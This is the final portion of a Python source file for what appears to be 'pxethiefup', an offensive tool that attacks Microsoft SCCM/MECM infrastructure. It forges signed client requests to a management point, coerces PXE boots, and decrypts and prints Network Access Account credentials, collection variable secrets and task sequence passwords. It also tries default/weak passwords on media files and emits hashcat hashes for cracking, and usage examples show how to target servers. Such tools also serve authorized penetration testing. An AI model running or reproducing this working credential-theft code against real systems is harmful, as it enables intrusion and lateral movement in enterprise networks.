            clientTokenSignature
        )
    except Exception as e:
        print("If you encountered errors at this point, it is likely as a result of one of two things: a) network connectivity or b) the signing algorithm\n")
        print("Fix network connectivity issues by ensuring you can connect to the HTTP port on the server and fixing DNS issues or by using the SCCM_BASE_URL to hardcode the beginning of the URL used to access the MP: e.g. http://192.168.56.101\n")
        # This should be worth reviewing more in depth, this could be caught another way for sure?
        print("The SHA1 signing algorithm is implemented by generateSignedData and the SHA256 signing algorithm is implemented by generateClientTokenSignature\n")
        print("If you encountered errors, for CCMClientIDSignature, CCMClientTimestampSignature and clientTokenSignature change the current signing algorithm to the one not in use")
        print(e)
        sys.exit(-1)

    # Processing the unknown computer collections for secrets
    for colsetting in colsettings:
        print("[+] Collection Variables found for 'All Unknown Computers' collection!")

        #Check to see if Collection Variables are encrypted
        data = False
        try:
            data = colsetting.content.decode("utf-16-le")
            data = True
        except (UnicodeDecodeError, AttributeError):
            #print("a") #Will hit this code branch if running over cleartext and the collection variables are not encrypted
            pass

        # Surely I can just push this into a function since it's used so often?
        if USING_TLS or data:
            wf_dstr = colsetting.content.decode("utf-16-le")
        else:
            dstr,cert_used = win32crypt.CryptDecryptMessage(decryptPara,colsetting.content)
            dstr = dstr.decode("utf-16-le")
            wf_dstr = "".join(c for c in dstr if c.isprintable())
            #print(wf_dstr)
        
        # Decrypt and Decompress the data
        root = ET.fromstring(wf_dstr)
        dstr = zlib.decompress(binascii.unhexlify(root.text)).decode("utf-16-le")
        wf_dstr = "".join(c for c in dstr if c.isprintable()) 

        # Again, this can be done in a better way for sure
        write_to_file(WORKING_DIR, "CollectionSettings", wf_dstr, "xml")

        #wf_dstr = dstr[dstr.find('<')-1:dstr.rfind('>')+1]
        root = ET.fromstring(wf_dstr)

        # Find all policies and actions
        instances = root.find("PolicyRule").find("PolicyAction").findall("instance")

        for instance in instances:
            encrypted_collection_var_secret = instance.xpath(".//*[@name='Value']/value")[0].text 
            collection_var_name = instance.xpath(".//*[@name='Name']/value")[0].text 

            print("[!] Collection Variable Name: '" + collection_var_name +"'")
            collection_var_secret = deobfuscate_credential_string(encrypted_collection_var_secret)
            collection_var_secret = collection_var_secret[:collection_var_secret.rfind('\x00')]
            print("[!] Collection Variable Secret: '" + collection_var_secret + "'")
    
    # Network Access Accounts
    print("[+] Decrypting Network Access Account Configuration")
    for naaConfig in naaConfigs:
        # Surely I can just push this into a function since it's used so often?
        if USING_TLS:
            dstr = naaConfig.content.decode("utf-16-le")
        else:
            dstr,cert_used = win32crypt.CryptDecryptMessage(decryptPara,naaConfig.content)
            dstr = dstr.decode("utf-16-le")
        
        wf_dstr = "".join(c for c in dstr if c.isprintable())
        process_naa_xml(wf_dstr)
        
    # Task Sequences Accounts
    print("[+] Decrypting Task Sequence Configuration\n")
    for tsConfig in tsConfigs:
        # Surely I can just push this into a function since it's used so often?
        if USING_TLS:
            dstr = tsConfig.content.decode("utf-16-le")
        else:
            dstr,cert_used = win32crypt.CryptDecryptMessage(decryptPara,tsConfig.content)
            dstr = dstr.decode("utf-16-le")

        wf_dstr = "".join(c for c in dstr if c.isprintable())
        tsSequence = process_task_sequence_xml(wf_dstr)
    
    if (VERBOSE):
        print("[+] Cleaning up")
    
    # Finish up the certificates and context
    win32crypt.CryptAcquireContext(certKeyContext["ContainerName"],certKeyContext["ProvName"],certKeyContext["ProvType"],16)
    cryptoProv.CryptReleaseContext()
    certStore.CertCloseStore()

def process_naa_xml(naa_xml):
    # Network Access Accounts
    print_nice("Extracting Network Access Accounts", "INFO")
    root = ET.fromstring(naa_xml)
    network_access_account_xml = root.xpath("//*[@class='CCM_NetworkAccessAccount']")

    # Add a catch for if there are no NAAs
    for naa_settings in network_access_account_xml:
        network_access_username = deobfuscate_credential_string(naa_settings.xpath(".//*[@name='NetworkAccessUsername']")[0].find("value").text)
        network_access_username = network_access_username[:network_access_username.rfind('\x00')]
        network_access_password = deobfuscate_credential_string(naa_settings.xpath(".//*[@name='NetworkAccessPassword']")[0].find("value").text)
        network_access_password = network_access_password[:network_access_password.rfind('\x00')]

        naa_credential_pair = network_access_username, network_access_password
        naa_credentials.append(naa_credential_pair)

    if (len(naa_credentials) == 0):
        print_nice("No Network Access Account Credentials found!", "ERROR")
    else:
        print_naa_credentials_table() 

def process_task_sequence_xml(ts_xml):
    root = ET.fromstring(ts_xml)
    # Find all pkgnames
    ts_sequences = root.xpath("//*[@name='TS_Sequence']/value")
    for i in range(len(ts_sequences)):
        # Find all task sequences
        pkg_name = root.xpath("//*[@name='PKG_Name']/value")[i].text 
        adv_id = root.xpath("//*[@name='ADV_AdvertisementID']/value")[i].text
        ts_sequence_tag = root.xpath("//*[@name='TS_Sequence']/value")[i].text
        tsName = pkg_name + "-" + adv_id
        keepcharacters = (' ','.','_', '-')
        tsName = "".join(c for c in tsName if c.isalnum() or c in keepcharacters).rstrip()

        if ts_sequence_tag[:9] == "<sequence":
            tsSequence = ts_sequence_tag
        else:
            # Normal Task Sequence
            try:
                # Attempt to decrypt the credential string
                tsSequence = deobfuscate_credential_string(ts_sequence_tag)
                print_nice(f"[!] Successfully Decrypted TS_Sequence XML Blob in Task Sequence '{pkg_name}'!", "SUCCESS")
            except:
                # If failed
                print_nice(f"Failed to decrypt TS_Sequence in '{pkg_name}'. The encryption used on the SCCM server may be different than expected?", "ERROR")
                return

        tsSequence = tsSequence[:tsSequence.rfind(">")+1]
        tsSequence = "".join(c for c in tsSequence if c.isprintable() or c in keepcharacters).rstrip()
        print_nice("Writing decrypted TaskSequence policy XML to 'TaskSequence_policy_" + tsName + ".xml'", "INFO")
        write_to_file(WORKING_DIR + "/policies","TaskSequence_policy_" + tsName, media_variables)

        print_nice("Writing decrypted TS_Sequence XML to '" + tsName + ".xml'", "INFO")
        write_to_file(WORKING_DIR  + "/policies", tsName, media_variables)

        print_nice(f"Attempting to automatically identify credentials in Task Sequence: '{pkg_name}'", "INFO")
        analyse_task_sequence_for_potential_creds(tsSequence)

def analyse_task_sequence_for_potential_creds(ts_xml):
    """Known tags: 
        property="DomainPassword" name="OSDJoinPassword", 
        property="DomainUsername" name="OSDJoinAccount", 
        property="AdminPassword" name="OSDLocalAdminPassword", 
        property="RegisteredUserName" name="OSDRegisteredUserName", 
        property="CapturePassword" name="OSDCaptureAccountPassword", 
        property="CaptureUsername" name="OSDCaptureAccount"
    """
    tree = ET.fromstring(ts_xml).getroottree()

    # Keywords to search through for potential credentials
    keyword_list = ["password", "account", "username"]
    element_search_list = []
    
    for word in keyword_list:
        # TODO  search through different attributes other than name? 
        element_search_list.append([word, tree.xpath('//*[contains(translate(@name,"ABCDEFGHIJKLMNOPQRSTUVWXYZ","abcdefghijklmnopqrstuvwxyz"),"' + word +'")]')]) 
    
    parent_list = []
    creds_found = False
    for word, elements in element_search_list:
        for element in elements:
            if not creds_found:
                # Print if a potential credential is in the list
                print_nice("Possible credential fields found!", "SUCCESS")
                creds_found = True

            # TODO if parent is defaultvarlist
            parent = element.getparent() 
            if parent not in parent_list:
                parent_list.append(parent)
                # Print the Task Sequence step it is using
                print("In TS Step \"" + parent.getparent().attrib["name"]+"\":")
                unique_words = [x for x in keyword_list if x != word]

                par = ET.ElementTree(parent)
                for unique_word in unique_words:
                    for el in par.xpath('//*[contains(translate(@name,"ABCDEFGHIJKLMNOPQRSTUVWXYZ","abcdefghijklmnopqrstuvwxyz"),"' + unique_word + '")]'):
                        # Duplicate tags that match more than one keyword
                        if el != element: 
                            print(el.attrib["name"] + " - " + el.text)        
                    
                print(element.attrib["name"] + " - " + str(element.text))
    
    if not creds_found:
        # Print no credentials found in task sequence
        print_nice("No credentials identified in this Task Sequence.", "ERROR")

def make_all_http_requests_and_retrieve_sensitive_policies(CCMClientID, CCMClientIDSignature, CCMClientTimestamp, CCMClientTimestampSignature, clientTokenSignature):
    # Retrieve all available Task sequences, NAA config and any identified collection settings and return to parsing function

    # ClientID is x64UnknownMachineGUID from /SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA request
    # print("[+] Retrieving Needed Metadata from SCCM Server...")
    sccm_base_url = SCCM_BASE_URL
    session = requests.Session()
    
    if USING_TLS:
        session.verify = False
        session.cert = (CERT_FILE,KEY_FILE)
        #requests.get('https://kennethreitz.org', cert=('/path/client.cert', '/path/client.key')) # supporting client certs
    if USING_PROXY:
        proxies = {"https":'127.0.0.1:8080'}
        session.proxies = proxies
    
    # ClientID is x64UnknownMachineGUID from /SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA request
    # Retrieve the Unknown x64 version of the BCD from the management endpoint
    print("[+] Retrieving x64UnknownMachineGUID from MECM MP...")
    r = session.get(sccm_base_url + "/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA")
    print(r)

    # Parse XML and retrieve x64UnknownMachineGUID
    root = ET.fromstring(r.text)
    clientID = root.find("UnknownMachines").get("x64UnknownMachineGUID")
    clientID = root.find("UnknownMachines").get("x86UnknownMachineGUID")
    sitecode = root.find("SITECODE").text


    if DUMP_MPKEYINFORMATIONMEDIA_XML:
        # Write ManagementPoinntKeyInformationMedia XML data to the folder
        f = open("MPKEYINFORMATIONMEDIA.xml", "w")
        f.write(r.text)
        f.close()

    # Add UTF-16-LE Byte Order Mark (BOM)
    first_payload = b'\xFF\xFE' + (
        '<Msg><ID/><SourceID>' + clientID + '</SourceID><ReplyTo>direct:OSD</ReplyTo><Body Type="ByteRange" Offset="0" Length="728"/><Hooks><Hook2 Name="clientauth"><Property Name="Token"><![CDATA[ClientToken:' + CCMClientID + ';' + CCMClientTimestamp + '\r\nClientTokenSignature:' + clientTokenSignature +'\r\n]]></Property></Hook2></Hooks><Payload Type="inline"/><TargetEndpoint>MP_PolicyManager</TargetEndpoint><ReplyMode>Sync</ReplyMode></Msg>'
    ).encode("utf-16-le")
    
    second_payload = (
        '<RequestAssignments SchemaVersion="1.00" RequestType="Always" Ack="False" ValidationRequested="CRC"><PolicySource>SMS:' + sitecode + '</PolicySource><ServerCookie/><Resource ResourceType="Machine"/><Identification><Machine><ClientID>' + clientID + '</ClientID><NetBIOSName></NetBIOSName><FQDN></FQDN><SID/></Machine></Identification></RequestAssignments>\r\n'
    ).encode("utf-16-le") + b'\x00\x00\x00'

    # Send a Message containing our Client ID and our valid token 
    me = MultipartEncoder(fields={
        'Msg': (None, first_payload, "text/plain; charset=UTF-16"), 
        'RequestAssignments': second_payload}
    )
    
    # Send request for the policy assignment 
    print("[+] Requesting policy assignments from MP...")
    r = session.request("CCM_POST",sccm_base_url + "/ccm_system/request", data=me, headers={'Content-Type': me.content_type.replace("form-data","mixed")})
    multipart_data = MultipartDecoder.from_response(r)

    # Get the zlib compressed policy locations and parse out the URLs for NAAConfig and TaskSequence
    policy_xml = zlib.decompress(multipart_data.parts[1].content).decode("utf-16-le")
    wf_policy_xml = "".join(c for c in policy_xml if c.isprintable())

    if DUMP_REPLYASSIGNMENTS_XML:
        # Unsure why this is here, but should come back to
        f = open("ReplyAssignments.xml", "w")
        f.write(wf_policy_xml)
        f.close()
    
    #Pull relevant configs from RequestAssignments XML
    allPoliciesURLs = {}

    root = ET.fromstring(wf_policy_xml)
    policyAssignments = root.findall("PolicyAssignment")
    dedup = 0

    for policyAssignment in policyAssignments:
        policies = policyAssignment.findall("Policy")
        for policy in policies:
            if policy.get("PolicyCategory") not in allPoliciesURLs and policy.get("PolicyCategory") is not None:
                allPoliciesURLs[policy.get("PolicyCategory")] = policy.find("PolicyLocation").text.replace("http://<mp>",sccm_base_url) 
            else:
                if policy.get("PolicyCategory") is None:
                    allPoliciesURLs["".join(i for i in policy.get("PolicyID") if i not in "\\/:*?<>|")] = policy.find("PolicyLocation").text.replace("http://<mp>",sccm_base_url) 
                else:
                    allPoliciesURLs[policy.get("PolicyCategory") + str(dedup)] = policy.find("PolicyLocation").text.replace("http://<mp>",sccm_base_url) 
                    dedup = dedup + 1

    # Print all policy assignment URLs
    print("[+] " + str(len(allPoliciesURLs)) + " policy assignment URLs found!")

    # Header Data for requesting future HTTP Policies
    headers = {
        'CCMClientID': CCMClientID, 
        "CCMClientIDSignature" : CCMClientIDSignature, 
        "CCMClientTimestamp" : CCMClientTimestamp, 
        "CCMClientTimestampSignature" : CCMClientTimestampSignature
    }
    
    if DUMP_POLICIES: 
        POLICY_FOLDER_PREFIX = SCCM_BASE_URL[7:].lstrip("/").rstrip("/")
        # Dump all config XMLs to disk - Uncomment to write to policies/*.xml
        policy_folder = os.getcwd() + "/" + POLICY_FOLDER_PREFIX + "_policies/"
        os.mkdir(policy_folder)
        for category, url in allPoliciesURLs.items():
            if category is not None:
                # Send a request for the policies
                print("[+] Requesting " + category + " from: " + url)
                content = session.get(url, headers=headers)
                f = open(policy_folder + category + ".xml", "wb")
                f.write(content.content)
                f.close()
            
    colsettings = []
    naaconfig = []
    tsconfig = []

    for category, url in allPoliciesURLs.items():
        if "NAAConfig" in category:
            # Append request for Network Access Account configuration
            print("[+] Requesting Network Access Account Configuration from: " + url)
            naaconfig.append(session.get(url, headers=headers))

        if "TaskSequence" in category:
            # Append request for Task Sequence Configuration
            print("[+] Requesting Task Sequence Configuration from: " + url)
            tsconfig.append(session.get(url, headers=headers))

        if "CollectionSettings" in category:
            # Append request for Collections Settings
            print("[+] Requesting Collection Settings from: " + url)
            colsettings.append(session.get(url, headers=headers))

    return naaconfig, tsconfig, colsettings

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
            prog="pxethiefup", 
            formatter_class=argparse.RawDescriptionHelpFormatter,
            description="An upgraded version of PXEThief used for extracting sensitive data from SCCM/MECM material and servers",
            epilog='''
Automatically scan across a network for PXE bootable devices and download the media variables file:
    python3 pxethiefup.py -a
    python3 pxethiefup.py --auto

Coerce a PXE boot against a specific MECM Distribution Point server:
    python3 pxethiefup.py -m -t 10.1.1.2
    python3 pxethiefup.py --manual -target 10.1.1.2

Search a folder for files and decrypt them (including ISO) and decrypt it:
    python pxethiefup.py -d -f "..\\folder\\"
    python pxethiefup.py --decrypt -f "..\\isoFolder\\"

Decrypt a partial or network based media - Variables file with no password or unknown password:
    python3 pxethiefup.py -d -vf variables.xml
    python3 pxethiefup.py --decrypt --variables variables.xml

Decrypt a partial or network based media - Variables file using a password:
    python3 pxethiefup.py -d -vf variables.xml -p password123
    python3 pxethiefup.py --decrypt --variables variables.xml --password password123
                
Decrypt the full media using a variables and policy file:
    python3 pxethiefup.py -d -vf variables.xml -pf policies.xml -p password123
    python3 pxethiefup.py --decrypt --variables variables.xml --policy policies.xml --password password123

Display the hash corresponding to a media variables file for cracking in hashcat:
    python3 pxethiefup.py -c -vf variables.xml
    python3 pxethiefup.py --crack --variables variables.xml
                '''
        )
    
    parser.add_argument("-a", "--auto", help="Automatically identify and download encrypted media file using DHCP PXE boot request", action="store_true")
    parser.add_argument("-m", "--manual", help="Coerce PXE Boot against a specific MECM Distribution Point server designated by IP address", action="store_true")
    parser.add_argument("-d", "--decrypt", help="Decrypt a media variables file and/or policies.xml", action="store_true")
    parser.add_argument("-c", "--crack", help="Print the hash corresponding to a specified media variables file for cracking in hashcat", action="store_true")
    parser.add_argument("-v", "--verbose", help="Enable verbose output", action="store_true")

    parser.add_argument("-t", "--target", help="Target IP address of the MECM Distribution Point server", nargs='?')
    parser.add_argument("-f", "--folder", help="Folder containing files for decryption")
    parser.add_argument("-vf", "--variables", help="Variable file to decrypt", nargs='?')
    parser.add_argument("-pf", "--policy", help="Policy file to decrypt")
    parser.add_argument("-p", "--password", help="Password to decrypt the media variables file", nargs='?')

    args = parser.parse_args()
    #parser.print_help()

    # If mutually exclusive options are selected, print help and exit
    count = 1
    if (args.auto):
        count += 1
    if (args.manual):
        count += 1
    if (args.decrypt):
        count += 1
    if (args.crack):
        count += 1

    #print(args)

    if (count > 2):
        print_nice("Please select only one option at a time", "ERROR")
        parser.print_help()
        sys.exit(0)
    elif (count < 2):
        print_nice("Please select an option", "ERROR")
        parser.print_help()
        sys.exit(0)

    if args.verbose:
        VERBOSE = True
    
    if (args.auto):
        print_nice("Finding and downloading encrypted media variables file from MECM server...")
        configure_scapy_networking(None)
        get_pxe_files(None)

    elif (args.manual):
        if args.target is None:
            print_nice("Please provide a target IP address or hostname", "ERROR")
            parser.print_help()
            sys.exit(0)    
        print_nice(f"Generating and downloading encrypted media variables file from MECM server located at: {args.target}")
        configure_scapy_networking(args.target)
        get_pxe_files(args.target)

    elif (args.decrypt):
        # Decrypt media variables file using password

        #print(args)

        variables_path = None
        password = None
        policy_path = None

        # Preflight Check for mutually exclusive options
        if (args.folder != None and args.variables != None):
            print_nice("Please select either a folder or a media variables file, not both", "ERROR")
            parser.print_help()
            sys.exit(0)

        # Folder Scanning
        if (args.folder != None):
            print_nice("Scanning folder for media variables file", "INFO")
            folder = args.folder
            # Catches the issue where an unescaped \\ is added to the end of the folder path
            if (folder.endswith("\"") == True):
                folder = folder[:-1]

            # Preflight check to ensure the folder exists
            if (os.path.isdir(folder) == False):
                print_nice("Folder does not exist, exiting", "ERROR")
                parser.print_help()
                sys.exit(0)

            variables_scan, policy_scan = scan_for_files(folder)
            if (variables_scan != None):
                variables_path = variables_scan
            if (policy_scan != None):
                policy_path = policy_scan

        # Raw flag for variables file
        if (args.variables != None):
            variables_path = args.variables
        elif (args.folder != None and args.variables == None):
            pass
        elif (variables_path == None):
            print_nice("Please provide a media variables file to decrypt", "ERROR")
            parser.print_help()
            sys.exit(0)

        if (args.policy != None):
            policy_path = args.policy


        if (args.password != None):
            password = args.password

        # print(f"Variables Path: {variables_path}")
        # print(f"Policy Path: {policy_path}")
        # print(f"Password: {password}")

        # Network Based / Standalone Media with a variables file only
        if (variables_path != None and policy_path == None):
            if (password == None):
                response, media_variables, resolved_password = test_default_weak_passwords_on_media(variables_path)
                if response:
                    print_nice("Successfully decrypted media variables file using default/weak password!", "SUCCESS")
            else:
                media_variables = decrypt_media_file(variables_path, password)

            if (media_variables == None):
                print_nice(f"Unable to Decrypt - Generating Hashcat hash for cracking", "ERROR")
                generate_hashcat(variables_path)
                sys.exit(-1)
            else:  
                extract_key_information_from_variables(media_variables)
                if (STANDALONE_MEDIA == "true"):
                    print_nice("Stand-alone media detected. Please supply policy file.")
                    sys.exit(0)
                else:
                    # Write the Media Variables to a file
                    print_nice("Writing media variables to variables.xml", "INFO")
                    write_to_file(WORKING_DIR, "variables", media_variables, "xml") 

                    # Parse media file in order to pull out PFX password and PFX bytes, then write them to a file
                    root = ET.fromstring(media_variables.encode("utf-16-le"))
                    smsMediaSiteCode = root.find('.//var[@name="_SMSTSSiteCode"]').text 
                    smsMediaGuid = (root.find('.//var[@name="_SMSMediaGuid"]').text)[:31]
                    smsTSMediaPFX = binascii.unhexlify(root.find('.//var[@name="_SMSTSMediaPFX"]').text)
                    filename = smsMediaSiteCode + "_" + smsMediaGuid +"_SMSTSMediaPFX.pfx"
                    print_nice("Writing _SMSTSMediaPFX to "+ filename + ". Certificate password is " + smsMediaGuid, "INFO")
                    write_to_file(WORKING_DIR, filename, smsTSMediaPFX, "binary")

                    if osName == "Windows":
                        # Download and extract the key data
                        process_pxe_bootable_and_prestaged_media(media_variables)
                    else:
                        print_nice("This tool uses win32crypt to retrieve passwords from MECM, which is not available on non-Windows platforms", "ERROR")
        # Standalone Media with a variables file and policy file
        elif (policy_path != None and variables_path != None):
            media_variables = None
            smsMediaGuid = None
            if (password == None):
                # If no password is set for Full Media, default password is used for Media Variables and _SMSMediaGuid variable is used for policy password
                blankPassword = "{BAC6E688-DE21-4ABE-B7FB-C9F54E6DB664}"
                response, media_variables = decrypt_file(variables_path, blankPassword.encode("utf-16-le"))
                if response:
                    print_nice("Successfully decrypted media variables file using blank password", "SUCCESS")
                    root = ET.fromstring(media_variables.encode("utf-16-le"))
                    smsMediaGuid = root.find('.//var[@name="_SMSMediaGuid"]').text
                else:
                    response, media_variables, validated_password = test_default_weak_passwords_on_media(variables_path)
                    if response:
                        print_nice("Successfully decrypted media variables file using default/weak password", "SUCCESS")
            else:
                media_variables = decrypt_media_file(variables_path, password)

            if (media_variables == None):
                print_nice("Unable to Decrypt - Generating Hashcat hash for cracking", "ERROR")
                generate_hashcat(variables_path)
                sys.exit(-1)
            
            extract_key_information_from_variables(media_variables)
            write_to_file(WORKING_DIR, "variables", media_variables)

            if (smsMediaGuid == None):
                # Means the media variables file was decrypted using a password
                process_full_media(password, policy_path)
            else:
                process_full_media(smsMediaGuid, policy_path)
            

        else:
            print_nice("Please provide a media variables file to decrypt", "ERROR")
            parser.print_help()
            sys.exit(0)


    elif (args.crack):
        # Output the hash of a encrypted variables file to crack offline using hashcat
        if (args.variables is None):
            print_nice("Please provide a media variables file to generate the hash for", "ERROR")
            parser.print_help()
            sys.exit(0)
        print_nice(f"Generating hash for media variables file: {args.variables}", "GREEN")
        generate_hashcat(args.variables)
